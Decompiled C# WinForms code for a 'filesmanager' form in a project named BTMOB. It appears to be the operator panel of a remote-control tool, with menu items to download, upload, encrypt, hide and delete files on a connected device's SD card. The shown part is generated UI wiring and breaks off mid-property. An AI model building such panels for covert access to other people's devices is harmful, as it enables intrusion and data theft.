using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using BTMOB.My;
using BTMOB.My.Resources;
using BrightIdeasSoftware;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json.Linq;

namespace BTMOB;

[DesignerGenerated]
public class filesmanager : Form
{
	public class FileRow
	{
		public string Name { get; set; }

		public string TypeDescription { get; set; }

		public string SizeDescription { get; set; }

		public string ModifiedDate { get; set; }

		public string CreateDate { get; set; }

		public Image Icon { get; set; }

		public bool IsFile { get; set; }

		public int Thumbloaded { get; set; }

		public int IconIndex { get; set; }

		public FileRow()
		{
			Thumbloaded = 0;
			IconIndex = 0;
		}
	}

	public struct DownloadData
	{
		public List<byte[]> Chunks;

		public string Filename;

		public long TotalSize;

		public long SentSize;

		public string FilePath { get; set; }
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__515_002D0
	{
		public List<OLVListItem> _0024VB_0024Local_visibleRows;

		public filesmanager _0024VB_0024Me;

		public _Closure_0024__515_002D0(_Closure_0024__515_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_visibleRows = arg0._0024VB_0024Local_visibleRows;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Local_visibleRows = _0024VB_0024Me.GetVisibleItems(_0024VB_0024Me.listfilesvew);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__515_002D1
	{
		public FileRow _0024VB_0024Local_fileRow;

		public _Closure_0024__515_002D2 _0024VB_0024NonLocal__0024VB_0024Closure_3;

		public VB_0024AnonymousDelegate_0 _0024I1;

		public _Closure_0024__515_002D1(_Closure_0024__515_002D1 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_fileRow = arg0._0024VB_0024Local_fileRow;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			try
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.listfilesvew.RefreshObject(_0024VB_0024Local_fileRow);
				_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.listfilesvew.RefreshItem(_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_item);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		[SpecialName]
		internal void _Lambda_0024__2()
		{
			try
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.listfilesvew.RefreshObject(_0024VB_0024Local_fileRow);
				_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.listfilesvew.RefreshItem(_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_item);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__515_002D2
	{
		public OLVListItem _0024VB_0024Local_item;

		public _Closure_0024__515_002D0 _0024VB_0024NonLocal__0024VB_0024Closure_2;

		public _Closure_0024__515_002D2(_Closure_0024__515_002D2 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_item = arg0._0024VB_0024Local_item;
			}
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeWidth_W8")]
	private DrakeWidth_W _DrakeWidth_W8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeWidth_W7")]
	private DrakeWidth_W _DrakeWidth_W7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mytitle")]
	private Label _mytitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refresher")]
	private System.Windows.Forms.Timer _refresher;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OpenToolStripMenuItem")]
	private ToolStripMenuItem _OpenToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CopyToolStripMenuItem")]
	private ToolStripMenuItem _CopyToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CutToolStripMenuItem")]
	private ToolStripMenuItem _CutToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PasteToolStripMenuItem")]
	private ToolStripMenuItem _PasteToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DownloadToolStripMenuItem")]
	private ToolStripMenuItem _DownloadToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UploadToolStripMenuItem")]
	private ToolStripMenuItem _UploadToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EncryptToolStripMenuItem")]
	private ToolStripMenuItem _EncryptToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DecodeToolStripMenuItem")]
	private ToolStripMenuItem _DecodeToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ZipToolStripMenuItem")]
	private ToolStripMenuItem _ZipToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UnZipToolStripMenuItem")]
	private ToolStripMenuItem _UnZipToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteToolStripMenuItem")]
	private ToolStripMenuItem _DeleteToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AddFilesToolStripMenuItem")]
	private ToolStripMenuItem _AddFilesToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RenameToolStripMenuItem")]
	private ToolStripMenuItem _RenameToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HideToolStripMenuItem")]
	private ToolStripMenuItem _HideToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ShowToolStripMenuItem")]
	private ToolStripMenuItem _ShowToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PlaySoundToolStripMenuItem")]
	private ToolStripMenuItem _PlaySoundToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FolderDownloadsToolStripMenuItem")]
	private ToolStripMenuItem _FolderDownloadsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem2")]
	private ToolStripMenuItem _ToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SDCARDToolStripMenuItem")]
	private ToolStripMenuItem _SDCARDToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem3")]
	private ToolStripMenuItem _ToolStripMenuItem3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem4")]
	private ToolStripMenuItem _ToolStripMenuItem4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem5")]
	private ToolStripMenuItem _ToolStripMenuItem5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem6")]
	private ToolStripMenuItem _ToolStripMenuItem6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pathtxt")]
	private DrakeUITextBox _pathtxt;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchtext")]
	private DrakeUITextBox _searchtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("viwimage")]
	private PictureBox _viwimage;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private System.Windows.Forms.Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("backgroundWorker")]
	private BackgroundWorker _backgroundWorker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVDATA")]
	private DataGridView _DGVDATA;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClearAllToolStripMenuItem")]
	private ToolStripMenuItem _ClearAllToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("listfilesvew")]
	private FastObjectListView _listfilesvew;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StopDownloadToolStripMenuItem")]
	private ToolStripMenuItem _StopDownloadToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PreviewToolStripMenuItem")]
	private ToolStripMenuItem _PreviewToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem7")]
	private ToolStripMenuItem _ToolStripMenuItem7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DownloadFileToolStripMenuItem")]
	private ToolStripMenuItem _DownloadFileToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("autoloadtogle")]
	private DrakeUIButtonIcon _autoloadtogle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("toggleview")]
	private DrakeUIButtonIcon _toggleview;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clrbtn")]
	private DrakeUIButtonIcon _clrbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("srchfilsbtn")]
	private DrakeUIButtonIcon _srchfilsbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("closbtn")]
	private DrakeUIButtonIcon _closbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nav1btn")]
	private DrakeUIButtonIcon _nav1btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nav2btn")]
	private DrakeUIButtonIcon _nav2btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nav3btn")]
	private DrakeUIButtonIcon _nav3btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("shortbtn1")]
	private DrakeUIButtonIcon _shortbtn1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("shortbtn6")]
	private DrakeUIButtonIcon _shortbtn6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("shortbtn2")]
	private DrakeUIButtonIcon _shortbtn2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("shortbtn3")]
	private DrakeUIButtonIcon _shortbtn3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("shortbtn5")]
	private DrakeUIButtonIcon _shortbtn5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("shortbtn4")]
	private DrakeUIButtonIcon _shortbtn4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVFIND")]
	private DataGridView _DGVFIND;

	public BTClient Btcli;

	private List<Array> Clipboard;

	public Dictionary<string, DownloadData> downloads;

	public Dictionary<string, string> visited;

	public object downloadsLock;

	public bool isloading;

	private int Mx;

	private int Sw;

	private bool movX;

	private int Myyy;

	private int Sh;

	private bool movY;

	private List<FileRow> searchbefore;

	private string lastsearchplace;

	private bool loadimages;

	public Dictionary<string, DataGridViewRow> downloadsrows;

	private bool _thumbView;

	internal virtual DrakeWidth_W DrakeWidth_W8
	{
		[CompilerGenerated]
		get
		{
			return _DrakeWidth_W8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = DrakeWidth_W8_MouseDown;
			MouseEventHandler value3 = DrakeWidth_W8_MouseMove;
			MouseEventHandler value4 = DrakeWidth_W8_MouseUp;
			DrakeWidth_W drakeWidth_W = _DrakeWidth_W8;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown -= value2;
				drakeWidth_W.MouseMove -= value3;
				drakeWidth_W.MouseUp -= value4;
			}
			_DrakeWidth_W8 = value;
			drakeWidth_W = _DrakeWidth_W8;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown += value2;
				drakeWidth_W.MouseMove += value3;
				drakeWidth_W.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W5")]
	internal virtual DrakeWidth_W DrakeWidth_W5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W6")]
	internal virtual DrakeWidth_W DrakeWidth_W6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeWidth_W DrakeWidth_W7
	{
		[CompilerGenerated]
		get
		{
			return _DrakeWidth_W7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = DrakeWidth_W7_MouseDown;
			MouseEventHandler value3 = DrakeWidth_W7_MouseMove;
			MouseEventHandler value4 = DrakeWidth_W7_MouseUp;
			DrakeWidth_W drakeWidth_W = _DrakeWidth_W7;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown -= value2;
				drakeWidth_W.MouseMove -= value3;
				drakeWidth_W.MouseUp -= value4;
			}
			_DrakeWidth_W7 = value;
			drakeWidth_W = _DrakeWidth_W7;
			if (drakeWidth_W != null)
			{
				drakeWidth_W.MouseDown += value2;
				drakeWidth_W.MouseMove += value3;
				drakeWidth_W.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label mytitle
	{
		[CompilerGenerated]
		get
		{
			return _mytitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = titlestng_MouseDown;
			Label label = _mytitle;
			if (label != null)
			{
				label.MouseDown -= value2;
			}
			_mytitle = value;
			label = _mytitle;
			if (label != null)
			{
				label.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("myico")]
	internal virtual PictureBox myico
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("myscr")]
	internal virtual PictureBox myscr
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual System.Windows.Forms.Timer refresher
	{
		[CompilerGenerated]
		get
		{
			return _refresher;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = refresher_Tick;
			System.Windows.Forms.Timer timer = _refresher;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_refresher = value;
			timer = _refresher;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W1")]
	internal virtual DrakeWidth_W DrakeWidth_W1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxMenu")]
	internal virtual ContextMenuStrip ctxMenu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripMenuItem1")]
	internal virtual ToolStripMenuItem ToolStripMenuItem1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem OpenToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _OpenToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OpenToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _OpenToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_OpenToolStripMenuItem = value;
			toolStripMenuItem = _OpenToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CopyToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CopyToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CopyToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CopyToolStripMenuItem = value;
			toolStripMenuItem = _CopyToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CutToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CutToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CutToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CutToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CutToolStripMenuItem = value;
			toolStripMenuItem = _CutToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem PasteToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PasteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PasteToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PasteToolStripMenuItem = value;
			toolStripMenuItem = _PasteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem DownloadToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _DownloadToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DownloadToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _DownloadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_DownloadToolStripMenuItem = value;
			toolStripMenuItem = _DownloadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem UploadToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _UploadToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = UploadToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _UploadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_UploadToolStripMenuItem = value;
			toolStripMenuItem = _UploadToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem EncryptToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _EncryptToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = EncryptToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _EncryptToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_EncryptToolStripMenuItem = value;
			toolStripMenuItem = _EncryptToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem DecodeToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _DecodeToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DecodeToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _DecodeToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_DecodeToolStripMenuItem = value;
			toolStripMenuItem = _DecodeToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ZipToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ZipToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ZipToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ZipToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ZipToolStripMenuItem = value;
			toolStripMenuItem = _ZipToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem UnZipToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _UnZipToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = UnZipToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _UnZipToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_UnZipToolStripMenuItem = value;
			toolStripMenuItem = _UnZipToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem DeleteToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _DeleteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DeleteToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _DeleteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_DeleteToolStripMenuItem = value;
			toolStripMenuItem = _DeleteToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem AddFilesToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _AddFilesToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = AddFilesToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _AddFilesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_AddFilesToolStripMenuItem = value;
			toolStripMenuItem = _AddFilesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem RenameToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RenameToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RenameToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _RenameToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RenameToolStripMenuItem = value;
			toolStripMenuItem = _RenameToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("EditToolStripMenuItem")]
	internal virtual ToolStripMenuItem EditToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem HideToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _HideToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = HideToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _HideToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_HideToolStripMenuItem = value;
			toolStripMenuItem = _HideToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ShowToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ShowToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ShowToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ShowToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ShowToolStripMenuItem = value;
			toolStripMenuItem = _ShowToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("SetWallpaperToolStripMenuItem")]
	internal virtual ToolStripMenuItem SetWallpaperToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem PlaySoundToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PlaySoundToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PlaySoundToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PlaySoundToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PlaySoundToolStripMenuItem = value;
			toolStripMenuItem = _PlaySoundToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem FolderDownloadsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _FolderDownloadsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = FolderDownloadsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _FolderDownloadsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_FolderDownloadsToolStripMenuItem = value;
			toolStripMenuItem = _FolderDownloadsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem2
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem2_Click;
